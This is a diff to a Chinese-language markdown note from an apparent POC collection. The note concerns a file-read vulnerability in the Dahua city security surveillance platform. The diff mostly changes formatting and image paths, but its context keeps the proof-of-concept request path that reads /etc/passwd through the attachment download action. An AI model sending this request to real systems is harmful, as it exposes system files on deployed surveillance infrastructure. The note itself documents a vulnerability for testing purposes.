@@ -6,9 +6,7 @@
 
 ## 漏洞影响
 
-```
 大华城市安防监控系统平台管理
-```
 
 ## FOFA
 
@@ -20,7 +18,7 @@
 
 登录页面
 
-![image-20220519183144081](./images/202205191831267.png)
+![image-20230704113653161](D:\TMP_FILE\awesome-poc\iot\images\image-20230704113653161.png)
 
 验证POC
 
@@ -28,4 +26,4 @@
 /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
 ```
 
-![image-20220519183319607](./images/202205191833705.png)
+![image-20230704113705975](D:\TMP_FILE\awesome-poc\iot\images\image-20230704113705975.png)
